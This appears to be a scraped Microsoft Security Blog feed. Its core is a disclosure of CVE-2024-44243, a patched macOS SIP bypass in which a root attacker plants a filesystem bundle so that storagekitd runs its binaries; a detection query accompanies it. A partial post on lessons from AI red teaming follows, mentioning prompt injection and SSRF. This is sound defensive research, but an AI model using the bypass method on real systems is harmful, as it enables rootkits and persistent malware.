With automated and customizable workflows, continuous threat prioritization, containment, and remediation, you gain a proactive and collaborative approach to securing endpoints, networks, and cloud—reducing the likelihood of breaches and minimizing downtime.&lt;/li&gt;
&lt;/ol&gt;



&lt;h2 class="wp-block-heading"&gt;Why MSPs can’t afford to wait&lt;/h2&gt;



&lt;p&gt;In a world where attackers can compromise a network in under an hour, every second counts. Without the ability to detect, analyze, and respond to security threats in real time, your customers face serious risks:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Downtime from a successful attack, leading to lost revenue.&lt;/li&gt;



&lt;li&gt;Loss of sensitive data, with potential regulatory fines to follow.&lt;/li&gt;



&lt;li&gt;Reputational damage that’s hard to repair.&lt;/li&gt;

&lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/"&gt;Analyzing CVE-2024-44243, a macOS System Integrity Protection bypass through kernel extensions&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;Microsoft Threat Intelligence discovered a new macOS vulnerability that could allow attackers to bypass Apple’s &lt;a href="https://developer.apple.com/documentation/security/disabling_and_enabling_system_integrity_protection" rel="noreferrer noopener" target="_blank"&gt;System Integrity Protection&lt;/a&gt; (SIP) in macOS by loading third party kernel extensions. SIP is a security technology that restricts the performance of operations that may compromise system integrity; thus, a SIP bypass affects the overall security of the operating system. Bypassing SIP could lead to serious consequences, such as increasing the potential for attackers and malware authors to successfully install rootkits, create persistent malware, bypass Transparency, Consent and Control (TCC), and expand the attack surface for additional techniques and exploits.&lt;/p&gt;



&lt;p&gt;We shared these findings with Apple through &lt;a href="https://www.microsoft.com/msrc/cvd"&gt;Coordinated Vulnerability Disclosure&lt;/a&gt; (CVD) via &lt;a href="https://www.microsoft.com/msrc/msvr"&gt;Microsoft Security Vulnerability Research&lt;/a&gt; (MSVR). A fix for this vulnerability, now identified as &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-44243" rel="noreferrer noopener" target="_blank"&gt;CVE-2024-44243&lt;/a&gt;, was included in the &lt;a href="https://support.apple.com/en-us/121839" rel="noreferrer noopener" target="_blank"&gt;security updates&lt;/a&gt; released by Apple on December 11, 2024. The findings were discovered in parallel between Microsoft and &lt;a href="https://x.com/patch1t" rel="noreferrer noopener" target="_blank"&gt;Mickey Jin&lt;/a&gt;, who also responsibly reported the vulnerability to Apple. Users should ensure their systems are up to date. We thank the Apple security team for their collaboration and efforts in fixing this issue.&lt;/p&gt;



&lt;p&gt;In many cases, special entitlements are leveraged to bypass security mechanisms like SIP, making it essential to monitor specially entitled processes for anomalous behavior. This need for proactive monitoring is only further emphasized when a specially entitled process invokes kernel extensions from third party organizations without proper validation or reduced privileges, which an attacker could exploit to install a kernel driver (rootkit) in a way that could evade detection by security solutions. Following our previous SIP bypass blog posts (&lt;a href="https://www.microsoft.com/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/"&gt;Shrootless&lt;/a&gt;, &lt;a href="https://www.microsoft.com/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/"&gt;Migraine&lt;/a&gt;), our team set up mechanisms to proactively alert on potentially attacker-controlled child processes of special entitled processes, which enabled Microsoft Defender and our researcher team to ultimately identify CVE-2024-44243.&lt;/p&gt;



&lt;p&gt;In this blog post, we detail the connection between entitlements and SIP and explain how CVE-2024-44243 could be used to bypass SIP security measures. This research also highlights some of the benefits and challenges of kernel-based monitoring. Prohibiting third party code to run in the kernel can increase macOS reliability, the tradeoff being that it reduces monitoring capabilities for security solutions. If SIP is bypassed, the entire operating system can no longer be considered reliable, and with reduced monitoring visibility, threat actors can tamper with any security solutions on the device to evade detection. As such, this research is being presented to the broader security community to underline the critical role of responsible disclosure and collaborative efforts in securing devices across platforms.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="understanding-sip-and-entitled-processes"&gt;Understanding SIP and entitled processes&lt;/h2&gt;



&lt;p&gt;As previously covered in our previous SIP bypass blogposts (&lt;a href="https://www.microsoft.com/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/"&gt;Shrootless&lt;/a&gt;, &lt;a href="https://www.microsoft.com/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/"&gt;Migraine&lt;/a&gt;), SIP (also known as “rootless”) is a macOS mechanism that enforces several operating system protections against the root user, including the ability to:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Load arbitrary kernel drivers&lt;/li&gt;



&lt;li&gt;Change non-volatile random-access memory (NVARM) variables&lt;/li&gt;



&lt;li&gt;Get task ports for Apple-signed processes&lt;/li&gt;



&lt;li&gt;Allow kernel debugging&lt;/li&gt;



&lt;li&gt;Modify sensitive files that are a part of the operating system&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;One interesting fact about SIP is that bypassing just one of those restrictions is likely to lead to bypasses of all other SIP restrictions – for example:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;SIP policy is controlled by NVRAM variables, so modifying NVRAM variables bypasses SIP.&lt;/li&gt;



&lt;li&gt;Kernel code execution (either through kernel extensions or debugging) can change SIP since it is enforced at the kernel level.&lt;/li&gt;



&lt;li&gt;Modifying sensitive files on the file system can bypass SIP, for instance, by modifying the list of allowed kernel extensions and then loading that kernel extension.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;SIP bypasses have traditionally focused on special binaries with specific &lt;a href="https://developer.apple.com/documentation/bundleresources/entitlements" rel="noreferrer noopener" target="_blank"&gt;entitlements&lt;/a&gt;. As a reminder, entitlements are special capabilities a process might have and are a part of the digital signature of the process. Therefore, entitlements cannot be easily forged by attackers. In addition to the well-documented entitlements available for software developers, certain entitlements are reserved only for processes that have specific operating system functions, such as system updates, debugging capabilities, memory tracing, and security extensions. We refer to them as private entitlements, as their name would commonly start with a &lt;em&gt;com.apple.private&lt;/em&gt; prefix. There are many of those special entitlements, most are not documented by Apple at all.&lt;/p&gt;



&lt;p&gt;Our team has identified the criticality in monitoring anomalous behavior by those specially entitled processes, as in many cases special entitlements could be used for bypassing security mechanisms. For example:&lt;/p&gt;



&lt;figure class="wp-block-table table"&gt;&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;/th&gt;&lt;th&gt;&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Entitlement&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;com.apple.rootless.install&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;Processes entitled with the &lt;em&gt;com.apple.rootless.install&lt;/em&gt; entitlement can bypass SIP file system checks. Several examples that abuse that entitlement have been reported, including: &lt;br /&gt;&amp;#8211; Reported by Stefan Esser and &lt;a href="https://www.slideshare.net/slideshow/syscan360-stefan-esser-os-x-el-capitan-sinking-the-ship/59926048" rel="noreferrer noopener" target="_blank"&gt;presented&lt;/a&gt; at SyScan360, this vulnerability misused the fact that &lt;em&gt;fsck_cs&lt;/em&gt; follows symbolic links and could therefore write to arbitrary file paths.&lt;br /&gt;&amp;#8211; CVE-2022-26712 – &lt;a href="https://jhftss.github.io/CVE-2022-26712-The-POC-For-SIP-Bypass-Is-Even-Tweetable/" rel="noreferrer noopener" target="_blank"&gt;reported&lt;/a&gt; by Mickey Jin. The vulnerability abuses the &lt;em&gt;SystemShoveService.xpc&lt;/em&gt; XPC service, which is entitled with the &lt;em&gt;com.apple.rootless.install&lt;/em&gt; entitlement.&lt;br /&gt; &lt;br /&gt;Note that this is not a complete list of vulnerabilities associated with that entitlement.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;com.apple.rootless.install.heritable&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;Processes entitled with the &lt;em&gt;com.apple.rootless.install.heritable&lt;/em&gt; inherit the &lt;em&gt;com.apple.rootless.install&lt;/em&gt; entitlement to all their child processes. Notable examples include: &lt;br /&gt;&amp;#8211; CVE-2019-8561 – &lt;a href="https://www.trendmicro.com/en_us/research/22/k/cve-2019-8561-a-hard-to-banish-packagekit-framework-vulnerabilit.html" rel="noreferrer noopener" target="_blank"&gt;discovered&lt;/a&gt; by Trend Micro. The vulnerability leverages a Time-of-check-time-of-use (TOCTOU) issue in the &lt;em&gt;system_installd&lt;/em&gt; binary.&lt;br /&gt;&amp;#8211; CVE-2020–9854 – &lt;a href="https://objective-see.org/blog/blog_0x4D.html" rel="noreferrer noopener" target="_blank"&gt;reported&lt;/a&gt; by Ilias Morad, which exploited a specific installer script that was spawned by &lt;em&gt;system_installd&lt;/em&gt; and allowed an arbitrary process execution from a command-line argument.&lt;br /&gt;&amp;#8211; CVE-2021-30892 – reported by Microsoft Defender, known as “&lt;a href="https://www.microsoft.com/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/"&gt;Shrootless&lt;/a&gt;”. The vulnerability abuses Apple-signed package that includes shell script components and abuses the &lt;em&gt;system_installd&lt;/em&gt; binary.&lt;br /&gt;&amp;#8211; CVE-2022-22583 – &lt;a href="https://perception-point.io/blog/technical-analysis-cve-2022-22583/" rel="noreferrer noopener" target="_blank"&gt;reported&lt;/a&gt; by Perception Point. This vulnerability is a variant on our previously reported Shrootless vulnerability and takes advantage of a the &lt;em&gt;/tmp&lt;/em&gt; symbolic link used by &lt;em&gt;system_installd&lt;/em&gt;.&lt;br /&gt;&amp;#8211; CVE-2023-32369 – reported by Microsoft Defender, known as “&lt;a href="https://www.microsoft.com/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/"&gt;Migraine&lt;/a&gt;”. The exploit abuses the system migration daemon (&lt;em&gt;migrationd&lt;/em&gt; ). &lt;br /&gt;&lt;br /&gt;Note that this is not a complete list of vulnerabilities associated with that entitlement.&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;There are other entitlements that could be used for other types of vulnerabilities, such as the &lt;em&gt;com.apple.private.tcc.allow&lt;/em&gt; entitlement, which could be used for &lt;a href="https://www.microsoft.com/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/"&gt;TCC bypasses&lt;/a&gt;, which we also monitor. However, in this blog post we will focus on SIP-related entitlements only.&lt;/p&gt;



&lt;p&gt;Due to the sensitive nature of the &lt;em&gt;com.apple.rootless.install.heritable&lt;/em&gt; entitlement, it is evident that monitoring anomalous child processes of processes entitled with &lt;em&gt;com.apple.rootless.install.heritable&lt;/em&gt; is important for security research.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="discovery-of-sip-bypasses-through-custom-file-systems"&gt;Discovery of SIP bypasses through custom file systems&lt;/h2&gt;



&lt;p&gt;One of the processes entitled with the previously described &lt;em&gt;com.apple.rootless.install.heritable&lt;/em&gt; entitlement is &lt;em&gt;storagekitd&lt;/em&gt;, which is a daemon that handles disk state-keeping by the Storage Kit private framework.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of code depicting storagekitd and its SIP-related entitlements" class="wp-image-137048" height="535" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/01/image.jpg" width="937" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 1. storagekitd and its SIP-related entitlements&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;As shown, &lt;em&gt;storagekitd&lt;/em&gt; has many SIP bypassing capabilities, including the &lt;em&gt;com.apple.rootless.install.heritable&lt;/em&gt;, which means all its child processes are of great interest.&lt;/p&gt;



&lt;p&gt;Using &lt;a href="https://learn.microsoft.com/defender-xdr/advanced-hunting-query-language"&gt;advanced hunting query language&lt;/a&gt;, we can look for all child processes of the &lt;em&gt;storagekitd&lt;/em&gt; daemon:&lt;/p&gt;


&lt;div class="wp-block-syntaxhighlighter-code "&gt;&lt;pre class="brush: plain; gutter: false; title: ; notranslate"&gt;
DeviceProcessEvents
| where InitiatingProcessFileName == &amp;quot;storagekitd&amp;quot;
    and FolderPath !startswith &amp;quot;/System&amp;quot;
    and FolderPath !startswith &amp;quot;/sbin&amp;quot;
    and FolderPath !startswith &amp;quot;/bin&amp;quot;
    and FolderPath !startswith &amp;quot;/usr&amp;quot;
| summarize by ProcessCommandLine
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Interestingly, we found several processes, which we immediately investigated:&lt;/p&gt;



&lt;figure class="wp-block-table table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Example path&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Explanation&lt;/strong&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;/Library/Filesystems/iboysoft_NTFS.fs/Contents/Resources/newfs_ms_ntfs&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;Custom NTFS implementation from &lt;a href="https://iboysoft.com" rel="noreferrer noopener" target="_blank"&gt;iBoysoft&lt;/a&gt;.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;/Library/Filesystems/tuxera_ntfs.fs/Contents/Resources/newfs_tuxera_ntfs&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;Custom NTFS implementation from &lt;a href="https://ntfsformac.tuxera.com" rel="noreferrer noopener" target="_blank"&gt;Tuxera&lt;/a&gt;.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;/Library/Filesystems/ufsd_ExtFS.fs/Contents/Resources/fsck_ufsd_ExtFS&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;Custom EXT file system implementation from &lt;a href="https://www.paragon-software.com" rel="noreferrer noopener" target="_blank"&gt;Paragon&lt;/a&gt;.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;/Library/Filesystems/ufsd_NTFS.fs/Contents/Resources/fsck_ufsd_NTFS&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;Custom NTFS implementation from &lt;a href="https://www.paragon-software.com" rel="noreferrer noopener" target="_blank"&gt;Paragon&lt;/a&gt;.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;/Library/Filesystems/easeus_NTFS.fs/Contents/Resources/newfs_easeus_NTFS&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;Custom NTFS implementation from &lt;a href="https://toolbox.easeus.com/ntfs-for-mac/" rel="noreferrer noopener" target="_blank"&gt;EaseUS&lt;/a&gt;.&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;We therefore attempted to install those solutions. By overriding the binaries under the relevant bundle under &lt;em&gt;/Library/Filesystems&lt;/em&gt; and triggering them with the Disk Utility app, we proved that we were able to bypass SIP protections, overriding the Apple kernel extensions exclusion list. Moreover, we have successfully been able to automate our process with the &lt;a href="https://ss64.com/mac/diskutil.html" rel="noreferrer noopener" target="_blank"&gt;diskutil&lt;/a&gt; utility, which, similarly to the &lt;a href="https://support.apple.com/guide/disk-utility/welcome/mac" rel="noreferrer noopener" target="_blank"&gt;Disk Utility&lt;/a&gt; app, uses the Storage Kit private framework:&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of code depicting storagekitd leading to SIP being bypassed" class="wp-image-137065 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/01/Figure-2.-SIP-bypass-done-by-triggering-storagekitd-1.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 2. SIP bypass done by triggering storagekitd&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;It’s important to note everything described in this blog post is a macOS vulnerability due to &lt;em&gt;storagekitd’s&lt;/em&gt; ability to invoke arbitrary processes without proper validation or dropping privileges, rather than a vulnerability in each of those products.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="experimenting-with-custom-file-systems"&gt;Experimenting with custom file systems&lt;/h2&gt;



&lt;p&gt;Mounting filesystems on macOS involves the Disk Arbitration daemon (&lt;em&gt;diskarbitrationd&lt;/em&gt;), which supports filesystems that are implemented in the kernel (APFS, HFS+) and those that are implemented in userspace. Filesystems implemented in userspace are known as User Filesystems (UserFS). macOS comes pre-shipped with several such filesystem implementations, each appears as a file system bundle (&lt;em&gt;*.fs&lt;/em&gt;) under &lt;em&gt;/System/Library/Filesystems and /Library/Filesystems&lt;/em&gt;.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of code depicting custom filesystem bundles" class="wp-image-137072 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/01/Figure-3.-Custom-filesystem-bundles-3.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 3. Custom filesystem bundles&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;While the structure of file system bundles is not-well documented, the &lt;em&gt;diskarbitrationd&lt;/em&gt; is fully &lt;a href="https://github.com/apple-open-source/macos/tree/master/DiskArbitration" rel="noreferrer noopener" target="_blank"&gt;open-source&lt;/a&gt;, which shows what properties are expected from such a bundle. The structure is as follows:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;A dictionary of &lt;em&gt;FSMediaTypes&lt;/em&gt; exists, in which the key is the file system formal name (or a designated GUID), and the value contains various content hints.&lt;/li&gt;



&lt;li&gt;More importantly, the bundle information clearly specifies the binary file names and command line-arguments that will be used for specific operations, such as mounting, repairing, and probing.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;a href="https://powerofcommunity.net/poc2024/Csaba%20Fitzl,%20Apple%20Disk-O%20Party.pdf" rel="noreferrer noopener" target="_blank"&gt;As described&lt;/a&gt; by Csaba Fitzl of Kandji in POC2024, upon mounting, the disk utility consults a specialized daemon known as the Storage Kit daemon (&lt;em&gt;storagekitd&lt;/em&gt;), which, in turn, uses the Disk Arbitration daemon (&lt;em&gt;diskarbitrationd&lt;/em&gt;) to invoke the right mount process via &lt;em&gt;posix_spawn&lt;/em&gt;. However, we noticed certain operations (such as “&lt;em&gt;disk repair&lt;/em&gt;”) are directly invoked under &lt;em&gt;storagekitd&lt;/em&gt;. Since an attacker that can run as root can drop a new file system bundle to &lt;em&gt;/Library/Filesystems&lt;/em&gt;, they can later trigger &lt;em&gt;storagekitd &lt;/em&gt;to spawn custom binaries, hence bypassing SIP.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of code depicting the new file system registration, including the name and executables to be run" class="wp-image-137050" height="952" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/01/image-2.jpg" width="677" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 4. New file system registration that includes the name and the executables to be run&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot depicting the Disk Utility recognizing the registered file system" class="wp-image-137046" height="714" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/01/image-1.jpg" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 5. Registered file system recognized by the Disk Utility&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;Triggering the &lt;em&gt;erase&lt;/em&gt; operation on the newly created file system can bypass SIP protections as well.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="detecting-the-vulnerability-with-microsoft-defender-for-endpoint-monitoring"&gt;Detecting the vulnerability with Microsoft Defender for Endpoint monitoring&lt;/h2&gt;



&lt;p&gt;System Integrity Protection (SIP) serves as a critical safeguard against malware, attackers, and other cybersecurity threats, establishing a fundamental layer of protection for macOS systems. Bypassing SIP impacts the entire operating system’s security and could lead to severe consequences, emphasizing the necessity for comprehensive security solutions that can detect anomalous behavior from specially entitled processes. The challenge of detecting such threats is compounded by the inherent limitations in kernel-level visibility on macOS, making it difficult for traditional security measures to spot and mitigate these sophisticated attacks.&lt;/p&gt;



&lt;p&gt;As our research demonstrates, an attacker with the ability to run as root could have exploited CVE-2024-44243 by loading third party kernel extensions to bypass SIP. To address these challenges, &lt;a href="https://learn.microsoft.com/microsoft-365/security/defender-vulnerability-management/defender-vulnerability-management"&gt;Microsoft Defender Vulnerability Management&lt;/a&gt;&amp;nbsp;quickly identifies and resolves CVE-2024-44243 and similar vulnerabilities&amp;nbsp;while &lt;a href="https://www.microsoft.com/security/business/endpoint-security/microsoft-defender-endpoint"&gt;Microsoft Defender for Endpoint&lt;/a&gt; offers robust monitoring capabilities designed to detect and alert on anomalous behavior associated with specially entitled processes on macOS. Proactive monitoring for such anomalies is crucial to enable defenders to stay ahead of emerging threats and mitigate potential risks effectively. By leveraging these advanced detection mechanisms, organizations can gain greater visibility into activities that may indicate an attempt to exploit vulnerabilities that bypass SIP and other protection technologies across platforms.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of code depicting a SIP bypass alert in Microsoft Defender for Endpoint" class="wp-image-137051 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/01/image-1.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 6. Microsoft Defender for Endpoint Potential System Integrity Protection bypass alert&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;This research underscores the importance of shared knowledge and collaborative efforts within the security community. We’d like to again thank Apple for their work in addressing this vulnerability, and Mickey Jin for responsibly disclosing the vulnerability in parallel with Microsoft. We believe that disseminating this information will not only foster responsible disclosure but also encourage collective action to fortify defenses against developing threats. By working together and leveraging the insights gained from these findings, we can better protect our systems and respond effectively to evolving security challenges.&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/01/13/3-takeaways-from-red-teaming-100-generative-ai-products/"&gt;3 takeaways from red teaming 100 generative AI products&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;Microsoft’s AI red team is excited to share our whitepaper, &amp;#8220;&lt;a href="https://aka.ms/AIRTLessonsPaper"&gt;Lessons from Red Teaming 100 Generative AI Products&lt;/a&gt;.&amp;#8221;&lt;/p&gt;



&lt;p&gt;The AI red team was formed in 2018 to address the growing landscape of AI safety and security risks. Since then, we have expanded the scope and scale of our work significantly. We are one of the first red teams in the industry to cover both security and responsible AI, and red teaming has become a key part of Microsoft’s approach to generative AI product development. Red teaming is the first step in identifying potential harms and is followed by important initiatives at the company to measure, manage, and govern AI risk for our customers. Last year, we also announced&amp;nbsp;&lt;a href="https://www.microsoft.com/en-us/security/blog/2024/02/22/announcing-microsofts-open-automation-framework-to-red-team-generative-ai-systems/"&gt;PyRIT&lt;/a&gt;&amp;nbsp;(The Python Risk Identification Tool for generative AI), an open-source toolkit to help researchers identify vulnerabilities in their own AI systems.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Pie chart showing the percentage breakdown of products tested by the Microsoft AI red team (AIRT). As of October 2024, we have conducted more than 80 operations covering more than 100 products." class="wp-image-137017 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/01/airt_ops_pie_chart-1.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Pie chart showing the percentage breakdown of products tested by the Microsoft AI red team. As of October 2024, we had red teamed more than 100 generative AI products.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;With a focus on our expanded mission, we have now red-teamed more than 100 generative AI products. The whitepaper we are now releasing provides more detail about our approach to AI red teaming and includes the following highlights:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Our AI red team ontology, which we use to model the main components of a cyberattack including adversarial or benign actors, TTPs (Tactics, Techniques, and Procedures), system weaknesses, and downstream impacts. This ontology provides a cohesive way to interpret and disseminate a wide range of safety and security findings.&lt;/li&gt;



&lt;li&gt;Eight main lessons learned from our experience red teaming more than 100 generative AI products. These lessons are geared towards security professionals looking to identify risks in their own AI systems, and they shed light on how to align red teaming efforts with potential harms in the real world.&lt;/li&gt;



&lt;li&gt;Five case studies from our operations, which highlight the wide range of vulnerabilities that we look for including traditional security, responsible AI, and psychosocial harms. Each case study demonstrates how our ontology is used to capture the main components of an attack or system vulnerability.&lt;/li&gt;
&lt;/ul&gt;

&lt;/div&gt;



&lt;h2 class="wp-block-heading" id="microsoft-ai-red-team-tackles-a-multitude-of-scenarios"&gt;Microsoft AI red team tackles a multitude of scenarios&lt;/h2&gt;



&lt;p&gt;Over the years, the &lt;a href="https://learn.microsoft.com/security/ai-red-team/" rel="noreferrer noopener" target="_blank"&gt;AI red team&lt;/a&gt; has tackled a wide assortment of scenarios that other organizations have likely encountered as well. We focus on vulnerabilities most likely to cause harm in the real world, and our whitepaper shares case studies from our operations that highlight how we have done this in four scenarios including security, responsible AI, dangerous capabilities (such as a model&amp;#8217;s ability to generate hazardous content), and psychosocial harms. As a result, we are able to recognize a variety of potential cyberthreats and adapt quickly when confronting new ones.&lt;/p&gt;



&lt;p&gt;This mission has given our red team a breadth of experiences to skillfully tackle risks regardless of:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;System type, including Microsoft Copilot, models embedded in systems, and open-source models.&lt;/li&gt;



&lt;li&gt;Modality, whether text-to-text, text-to-image, or text-to-video.&lt;/li&gt;



&lt;li&gt;User type—enterprise user risk, for example, is different from consumer risks and requires a unique red teaming approach. Niche audiences, such as for a specific industry like healthcare, also deserve a nuanced approach.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading" id="top-three-takeaways-from-the-whitepaper"&gt;Top three takeaways from the whitepaper&lt;/h2&gt;



&lt;p&gt;AI red teaming is a practice for probing the safety and security of generative AI systems.&amp;nbsp;Put simply, we &amp;#8220;break&amp;#8221; the technology so that others can build it back stronger. Years of red teaming have given us invaluable insight into the most effective strategies. In reflecting on the eight lessons discussed in the whitepaper, we can distill three top takeaways that business leaders should know.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="takeaway-1-generative-ai-systems-amplify-existing-security-risks-and-introduce-new-ones"&gt;Takeaway 1: Generative AI systems amplify existing security risks and introduce new ones&lt;/h3&gt;



&lt;p&gt;The integration of generative AI models into modern applications has introduced novel cyberattack vectors. However, many discussions around AI security overlook existing vulnerabilities. AI red teams should pay attention to cyberattack vectors both old and new.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Existing security risks&lt;/strong&gt;: Application security risks often stem from improper security engineering practices including outdated dependencies, improper error handling, credentials in source, lack of input and output sanitization, and insecure packet encryption. One of the case studies in our whitepaper describes how an outdated FFmpeg component in a video processing AI application introduced a well-known security vulnerability called server-side request forgery (SSRF), which could allow an adversary to escalate their system privileges.&lt;/li&gt;
&lt;/ul&gt;


&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="Flow chart showing an SSRF vulnerability in the GenAI application from red team case study." class="wp-image-137018 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/01/airt_ssrf_vuln-1-1024x433.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Illustration of the SSRF vulnerability in the video-processing generative AI application.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Model-level weaknesses&lt;/strong&gt;: AI models have expanded the cyberattack surface by introducing new vulnerabilities. Prompt injections, for example, exploit the fact that AI models often struggle to distinguish between system-level instructions and user data. Our whitepaper includes a red teaming case study  about how we used prompt injections to trick a vision language model.&lt;/li&gt;
&lt;/ul&gt;



&lt;blockquote class="wp-block-quote blockquote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;&lt;strong&gt;Red team tip&lt;/strong&gt;: AI red teams should be attuned to new cyberattack vectors while remaining vigilant for existing security risks. AI security best practices should include basic cyber hygiene.&lt;a id="_msocom_1"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;



&lt;h3 class="wp-block-heading" id="takeaway-2-humans-are-at-the-center-of-improving-and-securing-ai"&gt;Takeaway 2: Humans are at the center of improving and securing AI&lt;/h3&gt;



&lt;p&gt;While automation tools are useful for creating prompts, orchestrating cyberattacks, and scoring responses, red teaming can’t be automated entirely. AI red teaming relies heavily on human expertise.&lt;/p&gt;



&lt;p&gt;Humans are important for several reasons, including:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Subject matter expertise&lt;/strong&gt;: LLMs are capable of evaluating whether an AI model response contains hate speech or explicit sexual content, but they’re not as reliable at assessing content in specialized areas like medicine, cybersecurity, and CBRN (chemical, biological, radiological, and nuclear). These areas require subject matter experts who can evaluate content risk for AI red teams.&lt;/li&gt;



